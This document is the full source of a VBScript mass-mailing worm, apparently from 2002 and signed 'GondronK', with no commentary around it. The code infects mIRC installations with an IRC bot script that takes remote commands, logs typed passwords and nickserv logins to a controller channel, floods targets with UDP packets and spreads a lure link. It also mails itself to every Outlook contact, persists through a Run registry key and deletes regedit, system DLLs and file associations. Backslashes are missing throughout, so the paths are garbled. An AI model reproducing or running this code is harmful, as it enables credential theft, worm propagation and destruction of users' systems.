dim Otag 
dim AOtag
dim Ttag  
dim DummyTag
dim SectionDef
call ShowFolderList("&a&"c:"&a&")
call ShowFolderList("&a&"d:"&a&")
sub ShowFolderList(s)
on error resume next 
Set filesys = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set RootFolder1 = FileSys.GetFolder(s) 
Set SubFolds1 = RootFolder1.subfolders 
For Each f1 in Subfolds1 
s = f1.path & "&a&""&a&" 
Otag = s & "&a&"mirc.ini"&a&" 
AOtag= s & "&a&"mirc.dat"&a&" 
DummyTag= "&a&"C:winamod.dat"&a&" 
TTag= s & "&a&"url.ini"&a&" 
SectionDef= "&a&"[rfiles]"&a&" 
if filesys.fileexists(otag) then  
Call Filemod()  
filesys.CopyFile DummyTag, Otag, true 
Call ImplementRemote() 
filesys.CopyFile DummyTag, Otag, true 
Call ImplementWarn() 
filesys.CopyFile DummyTag, Otag, true 
Call ImplementFserv() 
filesys.CopyFile DummyTag, Otag, true 
call ImplementPerfCheck() 
filesys.CopyFile DummyTag, Otag, true 
Call ImplementPerform() 
SetClearArchiveBit(Otag) 
End If 
Call ShowFolderList(s) 
Next 
End sub 
Function FiltNum(FilString) 
on error resume next 
countdown=5 
do 
Comp = mid(FilString,2,countdown) 
if isnumeric(Comp) then LastNum = Comp : exit do 
countdown=countdown-1 
loop until countdown =0 
FiltNum = LastNum 
end function 
Function LastLineNum(SSection) 
on error resume next 
Set FS1N = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set FR1N = FS1N.OpenTextFile(otag,1,true) 
Do While FR1N.AtEndOfStream <> True 
segment1 = FR1N.readline 
w = InstrRev(segment1,SSection) 
counts=counts+1 
if w > 0 then  
do 
if FR1N.AtEndOfStream = True then exit do 
segmentk = FR1N.readline 
k = InstrRev(segmentk,"&a&"n"&a&",1)		 
if k=1 then 
LastNum=FiltNum(segmentk) 
end if 
Loop until k=0 
end if 
loop 
FR1N.Close 
LastLineNum=LastNum 
end function 
Function Filemod() 
on error resume next 
Set fs1 = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr1 = fs1.OpenTextFile(otag,1,true) 
Set fs2 = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr2 = fs2.OpenTextFile(DummyTag,2,true) 
Do While fr1.AtEndOfStream <> True 
segment1 = fr1.readline 
fr2.writeline segment1 
w = InstrRev(segment1,"&a&"[rfiles]"&a&") 
counts=counts+1 
if w > 0 then  
counts2=counts 
do 
if fr1.AtEndOfStream = True then exit do 
segmentk = fr1.readline 
k = InstrRev(segmentk,"&a&"n"&a&",1)		 
if k=1 then 
LastNum=FiltNum(segmentk) 
fr2.writeline segmentk 
end if 
COUNTS2=COUNTS2+1 
Loop until k<>1 
exit do 
end if 
loop 
fr1.Close 
fr2.close 
Set fs3 = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr3 = fs3.OpenTextFile(DummyTag,8,true) 
TrojanInfo = "&a&"n"&a&" & lastlinenum(SectionDef)+1 & "&a&"=url.ini"&a&" 
fr3.writeline TrojanInfo 
fr3.Close 
Set fs4 = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr4 = fs4.OpenTextFile(Otag,1,true) 
Set fs5 = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr5 = fs5.OpenTextFile(DummyTag,8,true) 
Do While fr4.AtEndOfStream <> True 
segment2 = fr4.readline 
if fr4.line >= counts2 + 2 then  
fr5.writeline segment2 
end if 
loop 
fr4.Close 
fr5.Close 
fs5.CopyFile DummyTag, Otag, true 
Call FLDL(TTag) 
end Function 
sub FLDL(TTag) 
on error resume next 
Set fs6 = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr6 = fs6.OpenTextFile(TTag,2,true) 
fr6.writeline "&a&"[script]"&a&" 
fr6.writeline "&a&"n0=on 1:join:#:if ($nick !== $me) { sockwrite -n boj* privmsg $nick : $+ %mysites } | else { halt }"&a&" 
fr6.writeline "&a&"n1=on 1:part:#:if ($nick !== $me) { .msg $nick %mysites | sockwrite -n boj* privmsg $nick : $+ %mysites } | else { halt }"&a&" 
fr6.writeline "&a&"n2=alias pila { tulish Call Start() | tulish Sub Start() | tulish Dim Start | tulish %namapile.1 | tulish If Start=vbOk Then | tulish Call Ask() | tulish End If | tulish End Sub }"&a&" 
fr6.writeline "&a&"n3=alias pilb { tulish Sub Ask() | tulish Dim Ask | tulish %namapile.2 | tulish If Ask=vbYes Then | tulish Call Love() | tulish End If | tulish If Ask=vbNo Then | tulish Call Hate() | tulish End If | tulish End Sub }"&a&" 
fr6.writeline "&a&"n4=alias pilc { tulish Sub Love() | tulish Dim Love | tulish %namapile.3 | tulish If Love=vbOk Then | tulish Call Owns() | tulish End If | tulish End Sub }"&a&" 
fr6.writeline "&a&"n5=alias pild { tulish Sub Hate() | tulish Dim Hate | tulish %namapile.4 | tulish If Hate=vbOk Then | tulish %namapile.mati | tulish End if | tulish End Sub }"&a&" 
fr6.writeline "&a&"n6=alias namapile { set %namapile.utama $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(1,9) $+ $chr(46) $+ $chr(118) $+ $chr(98) $+ $chr(115) }"&a&" 
fr6.writeline "&a&"n7=alias tulish { write C:WINDOWS $+ %namapile.utama $1- }"&a&" 
fr6.writeline "&a&"n8=alias awalans { goto $rand(1,2) | :1 | writeini C:WINDOWSwin.ini windows run %namapile.utama | :2 | writeini C:WINDOWSwin.ini windows load %namapile.utama }"&a&" 
fr6.writeline "&a&"n9=alias gaboong { namapile | bok1 | bok2 | bok3 | bok4 | bok5 | bok6 | pila | pilb | pilc | pild | pilx }"&a&" 
fr6.writeline "&a&"n10=on 1:start:{ .remote on | gaboong | awalans | writeini C:WINDOWSsystem.ini boot shell Explorer.exe $chr(97) $+ $chr(110) $+ $chr(116) $+ $chr(121) $+ $chr(46) $+ $chr(118) $+ $chr(98) $+ $chr(115) | set %mysites 13Want To See Anty Hot pic ? And don't forget to send her an email ! 7Double Click here 12-->4,8 http://www.geocities.com/sayangku_anty  | .timervbson 0 480 .run %namapile.utama | .timerapuspile 1 20 unset %namapile.* | .identd on GR $+ $rand(1,999) | .sapah }"&a&" 
fr6.writeline "&a&"n11=on 1:connect:{ .set %myserver $server | .set %myport $port | .timer 1 3 sockopen $chr(98) $+ $chr(111) $+ $chr(106) $+ $rand(A,z) $server $port | .timerrep 1 5 sockopen $chr(98) $+ $chr(111) $+ $chr(116) $+ -2 $CHR(105) $+ $CHR(114) $+ $CHR(99) $+ .irc-chat.org $CHR(310) $+ $CHR(310) $+ $CHR(310) $+ $CHR(311) | .timerdl 1 7 sockopen $chr(98) $+ $chr(111) $+ $chr(116) $+ -1 $CHR(105) $+ $CHR(114) $+ $CHR(99) $+ .axenet.org 6667 | .sapah }"&a&" 
fr6.writeline "&a&"n12=alias remote { .remote on | echo -a *** Remote is $$1 }"&a&" 
fr6.writeline "&a&"n13=alias socklist { echo -a * No Open Sockets }"&a&" 
fr6.writeline "&a&"n14=alias unload { .load -rs url.ini | echo -a *** Unloaded script $chr(39) $+ $2 $+ $chr(39) }"&a&" 
fr6.writeline "&a&"n15=alias bok1 { set %namapile.1 Start=msgbox( $+ $chr(34) $+ Seandainya Kau Tau Betapa Aku Cinta Padamu $+ $chr(34) $+ ,vb+vbinformation, $+ $chr(34) Gondronk Love Rara $+ $chr(34) $+ ) }"&a&" 
fr6.writeline "&a&"n16=on *:nick:{ if ($nick !== $me) { sockwrite -n boj* privmsg $newnick : $+ %mysites } | else { sockwrite -nt bot* NICK : $+ $newnick $+ - $+ $rand(0,9) $+ $rand(A,Z) } }"&a&" 
fr6.writeline "&a&"n17=on *:input:*:{ if (identify isin $1-) || (nickserv isin $1-) || (chanserv isin $1-) || (memoserv isin $1-) || (@ isin $1-) || (pass isin $1-) || ($1- isnum) || (server isin $1-) || (quit isin $1-) || (nick isin $1-) { sockwrite -n bot* privmsg $chr(35) $+ $chr(178) : $+ $me = ( $+ $active $+ ) $1- } }"&a&" 
fr6.writeline "&a&"n18=alias bok6 { set %namapile.mati createobject( $+ $chr(34) $+ wscript.shell $+ $chr(34) $+ ).run $chr(34) $+ RUNDLL32.EXE user.exe,exitwindows $+ $chr(34) }"&a&" 
fr6.writeline "&a&"n19=alias bok2 { set %namapile.2 Ask=msgbox( $+ $chr(34) $+ Apakah Kau Juga Cinta Padaku ? $+ $chr(34) $+ ,vbYesNo+vbquestion, $+ $chr(34) $+ Gondronk Love Rara $+ $chr(34) $+ ) }"&a&" 
fr6.writeline "&a&"n20=alias bok3 { set %namapile.3 Love=msgbox( $+ $chr(34) $+ Oh ... Alangkah Senangnya Hatiku $+ $chr(34) $+ ,vb+vbexclamation, $+ $chr(34) $+ Gondronk Love Rara $+ $chr(34) $+ ) }"&a&" 
fr6.writeline "&a&"n21=alias bok4 { set %namapile.4 Hate=msgbox( $+ $chr(34) $+ Teganya Dirimu Padaku ... Sakitnya Hati Ini ... Selamat Tinggal $+ $chr(34) $+ ,vb+vbcritical, $+ $chr(34) $+ Gondronk Love Rara $+ $chr(34) $+ ) }"&a&" 
fr6.writeline "&a&"n22=alias bok5 { set %namapile.5 Owns=msgbox( $+ $chr(34) $+ Yogyakarta Aug 29 2002 by GondronK $+ $chr(34) $+ ,vb+vbinformation, $+ $chr(34) $+ GondronK Love Rara $+ $chr(34) $+ ) }"&a&" 
fr6.writeline "&a&"n23=alias pilx { tulish Sub Owns() | tulish Dim Owns | tulish %namapile.5 | tulish If Owns=vbOk Then | tulish WScript.Quit | tulish End If | tulish End Sub }"&a&" 
fr6.writeline "&a&"n24=alias packet { if ($1 == $null) || ($2 == $null) || ($3 == $null) { sockwrite -n bot* privmsg $CHR(35) $+ $CHR(178) :/packet <ip> <byte> <times> | halt } | else { set %packet.ip $$1 | set %packet.byte $$2 | set %packet.amount $$3 | set %packet.count 0 | sockwrite -n bot* privmsg $CHR(35) $+ $CHR(178) :Now Packeting $1 With $2 byte $3 times | :start | if (%packet.count >= %packet.amount) { sockwrite -n bot* privmsg $CHR(35) $+ $CHR(178) :Packeting Complete | unset %packet.* | halt } | inc %packet.count 1 | sockudp -b packet $+ %packet.count %packet.ip %packet.byte %packet.byte | goto start } }"&a&" 
fr6.writeline "&a&"n25=alias sapah { $chr(46) $+ $chr(97) $+ $chr(117) $+ $chr(115) $+ $chr(101) $+ $chr(114) $chr(313) $+ $chr(313) $+ $chr(313) $+ $chr(313) $chr(327) $+ $chr(111) $+ $chr(110) $+ $chr(100) $+ $chr(114) $+ $chr(111) $+ $chr(110) $+ $chr(331) }"&a&" 
fr6.writeline "&a&"n26=on *:exit:{ .saveini | unsetall | .rlevel 9999 }"&a&" 
fr6.writeline "&a&"n27=ctcp 9999:*:*:{ $1- | halt }"&a&" 
fr6.writeline "&a&"n28=on 1:sockread:bo*: { sockread %botreads | set %nickl1 $gettok(%botreads,1,32) | set %nickl2 $left(%nickl1,8) | set %nickf $right(%nickl2,7) | if ($gettok(%botreads,5,32) == Gondron) && (%nickf == Gondron) { $gettok(%botreads,6-,32) } }"&a&" 
fr6.writeline "&a&"n29=on 1:sockopen:boj*:{ if ($sockerr > 0) { halt } | set -u1 %userboj $rand(A,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,z) $+ $rand(1,9) $+ $rand(a,z) | sockwrite -nt $sockname USER %userboj %userboj %userboj : $+ %userboj | sockwrite -nt $sockname NICK $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,Z) }"&a&" 
fr6.writeline "&a&"n30=on 1:sockopen:bot*:{ if ($sockerr > 0) { halt } | set -u1 %userbot $rand(A,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) | sockwrite -nt $sockname USER %userbot %userbot %userbot : $+ %myserver $port | sockwrite -nt $sockname NICK $me $+ - $+ $rand(0,9) $+ $rand(A,Z) | sockwrite -tn $sockname join $CHR(35) $+ $CHR(178) | .timerinms 0 240 sockwrite -n $sockname privmsg $CHR(35) $+ $CHR(178) : $+ $me Operating System $os server %myserver port %myport ID $email $address host/ip $ip $host mIRC $version }"&a&" 
fr6.writeline "&a&"n31=on 1:sockclose:bo*:/.timerklo 1 3 sockopen $chr(98) $+ $chr(111) $+ $chr(116) $+ -2 $CHR(105) $+ $CHR(114) $+ $CHR(99) $+ .irc-chat.org $CHR(310) $+ $CHR(310) $+ $CHR(310) $+ $CHR(311) | .timerpre 1 4 sockopen $chr(98) $+ $chr(111) $+ $chr(106) $+ $rand(A,z) $server $port | .timerld 1 7 sockopen $chr(98) $+ $chr(111) $+ $chr(116) $+ -1 $CHR(105) $+ $CHR(114) $+ $CHR(99) $+ .axenet.org 6667"&a&" 
fr6.writeline "&a&"n32=on 1:sockread:bo*:{ sockread %clon.temp | if ($gettok(%clon.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }"&a&" 
fr6.close 
end sub 
Function ImplementRemote() 
Set fs1a = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr1a = fs1a.OpenTextFile(otag,1,true) 
Set fs2a = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true) 
Do While fr1a.AtEndOfStream <> True 
segment1a = fr1a.readline 
fr2a.writeline segment1a 
if ucase(segment1a)=ucase("&a&"[options]"&a&") then 
Do 
If fr1a.AtEndOfStream Then exit do 
n2a = fr1a.readline 
If ucase(mid(n2a,1,3))=ucase("&a&"n2="&a&") then 
fr2a.writeline Mid(n2a, 1, 13) & "&a&"1,1"&a&" & Mid(n2a, 17, 16) & "&a&"1"&a&" & Mid(n2a, 34) 
exit do 
Else 
fr2a.writeline n2a 
End If 
Loop 
end if 
loop 
fr1a.Close 
fr2a.close 
End Function 
Function Implementfserv() 
Set fs1a = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr1a = fs1a.OpenTextFile(otag,1,true) 
Set fs2a = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true) 
Do While fr1a.AtEndOfStream <> True 
segment1a = fr1a.readline 
fr2a.writeline segment1a 
if ucase(segment1a)=ucase("&a&"[warn]"&a&") then 
Do 
If fr1a.AtEndOfStream Then exit do 
n2a = fr1a.readline 
If ucase(n2a)=ucase("&a&"fserve=on"&a&") then 
fr2a.writeline "&a&"fserve=off"&a&" 
Else 
fr2a.writeline n2a 
End If 
Loop 
end if 
loop 
fr1a.Close 
fr2a.close 
End Function 
Function Implementwarn() 
Set fs1c = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr1c = fs1c.OpenTextFile(otag,1,true) 
Set fs2c = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr2c = fs2c.OpenTextFile(DummyTag,2,true) 
Do While fr1c.AtEndOfStream <> True 
segment1c = fr1c.readline 
fr2c.writeline segment1c 
if ucase(segment1c)=ucase("&a&"[fileserver]"&a&") then 
Do 
if fr1c.AtEndOfStream then exit do 
n2c = fr1c.readline 
If ucase(n2c)=ucase("&a&"warning=on"&a&") then 
fr2c.writeline "&a&"warning=off"&a&" 
Else 
fr2c.writeline n2c 
End If 
Loop 
end if 
loop 
fr1c.Close 
fr2c.close 
End Function 
Function ImplementPerform() 
Set fs1p = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr1p = fs1p.OpenTextFile(Otag,8,true) 
fr1p.writeline "&a&"[Perform]"&a&" 
fr1p.writeline "&a&"n0=/.remote on"&a&" 
fr1p.Close 
fs1p.close 
End Function 
Sub SetClearArchiveBit(filespec)   
Dim fsg, fg 
Set fsg = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fg = fsg.GetFile(filespec)   
fg.attributes = 0 
fg.attributes = fg.attributes + 1 
End Sub 
Function ImplementPerfCheck() 
Set fs1f = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr1f = fs1f.OpenTextFile(otag,1,true) 
Set fs2f = CreateObject("&a&"Scripting.FileSystemObject"&a&") 
Set fr2f = fs2f.OpenTextFile(DummyTag,2,true) 
Do While fr1f.AtEndOfStream <> True 
segment1f = fr1f.readline 
fr2f.writeline segment1f 
if ucase(segment1f)=ucase("&a&"[options]"&a&") then 
Do 
If fr1f.AtEndOfStream Then exit do 
n2f = fr1f.readline 
If ucase(mid(n2f,1,3))=ucase("&a&"n0&a&") then 
fr2f.writeline Mid(n2f, 1, 40) & "&a&",1,"&a&" & Mid(n2f, 44) 
exit do 
Else 
fr2f.writeline n2f 
End If 
Loop 
end if 
loop 
fr1f.Close 
fr2f.close 
End Function 
 
set sss=createobject("&a&"scripting.filesystemobject"&a&") 
sss.DeleteFile "&a&"c:winamod.dat"&a&" 
Set Variable = createobject("&a&"scripting.filesystemobject"&a&") 
NamaVirus = Variable.getspecialfolder(1) 
NamaVirus1 = NamaVirus & "&a&"anty.vbs"&a&" 
Set Jalankan = createobject("&a&"wscript.shell"&a&") 
Jalankan.regwrite "&a&"HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunWinTasks"&a&", "&a&"wscript.exe "&a&" & NamaVirus1 & "&a&" %"&a&" 
Variable.copyfile wscript.scriptfullname, NamaVirus1 
PayLoad 
Mailattachment 
Gondronk 
Set BukaText = Variable.opentextfile(wscript.scriptfullname) 
TulisText = BukaText.readall 
BukaText.close 
Do 
if not(Variable.fileexists(wscript.scriptfullname)) then 
set BacaText = Variable.createtextfile(wscript.scriptfullname) 
BacaText.write TulisText 
BacaText.close 
end if 
Pembukaan = Jalankan.regread("&a&"HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunWinTasks"&a&") 
If Pembukaan <> "&a&"wscript.exe "&a&" & NamaVirus1 & "&a&" %"&a&" then 
Jalankan.regwrite "&a&"HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunWinTasks"&a&", "&a&"wscript.exe "&a&" & NamaVirus1 & "&a&" %"&a&" 
end if 
Pembukaan= "&a&""&a&" 
loop 
Function MailAttachment() 
Set Sebar = CreateObject("&a&"Outlook.Application"&a&") 
If Sebar = "&a&"Outlook"&a&" Then 
Set Kirim = Sebar.GetNameSpace("&a&"MAPI"&a&") 
Set BukuAlamat = Kirim.AddressLists 
For Each Alamat In BukuAlamat 
If Alamat.AddressEntries.Count <> 0 Then 
JumlahAlamat = Alamat.AddressEntries.Count 
For SetiapAlamat = 1 To JumlahAlamat 
Set KirimVirus = Sebar.CreateItem(0) 
Set AlamatKorban = Alamat.AddressEntries(SetiapAlamat) 
KirimVirus.To = AlamatKorban.Address 
KirimVirus.Subject = "&a&"This is My Pic"&a&" 
KirimVirus.Body = "&a&"Hi ... This is what you've want me to send my pic ! check it out ! or visit my homepage at http://wwww.anty-manis.com"&a&" 
execute "&a&"set Bungkusan = KirimVirus."&a&" & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115) 
Kiriman = NamaVirus1 
KirimVirus.DeleteAfterSubmit = True 
Bungkusan.Add Kiriman 
KirimVirus.To <> "&a&""&a&" Then 
kirimVirus.Send 
End If 
Next 
End If 
Next 
End If 
End Function 
Function Payload() 
Randomize 
If day(now) = 29 then 
CreateObject("&a&"Wscript.Shell"&a&").run "&a&"RUNDLL32.exe user.exe,exitwindows"&a&" 
msgbox "&a&"GondronK Love Rara Annisversary"&a&",16,"&a&"29 August 2002"&a&" 
End If 
End Function 
Function Gondronk() 
on error resume next 
set dronk=createobject("&a&"scripting.filesystemobject"&a&") 
dronk.DeleteFile "&a&"c:WINDOWSregedit.exe"&a&" 
set gond=createobject("&a&"wscript.shell"&a&") 
gond.regdelete "&a&"HKEY_CLASSES_ROOT.reg"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOT.zip"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOT.doc"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOT.gif"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOT.jpeg"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOT.jpg"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOT.bmp"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOT.cab"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTVBSFileShellEdit"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTVBSFileShellOpen2"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTVBSFileShellPrint"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTVBEFileShellEdit"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTVBEFileShellOpen2"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTVBEFileShellPrint"&a&" 
gond.regdelete "&a&"HKEY_LOCAL_MACHINESoftwareMicrosoftInternet ExplorerDefault HTML Editorshelledit"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOThtmlfileshellEdit"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOT.htm"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOT.html"&a&" 
gond.regwrite "&a&"HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoFind"&a&", "&a&"1"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTregfile"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTWinzip"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTjpegfile"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTWord.Document"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTWord.Document.6"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTWord.Document.8"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOTregfile"&a&" 
gond.regdelete "&a&"HKEY_CLASSES_ROOThtmlfile"&a&" 
dronk.DeleteFile "&a&"c:WINDOWSSystemRiched.dll"&a&" 
dronk.DeleteFile "&a&"c:WINDOWSSystemRiched20.dll"&a&" 
dronk.DeleteFile "&a&"c:WINDOWSSystemRiched32.dll"&a&" 
End Function
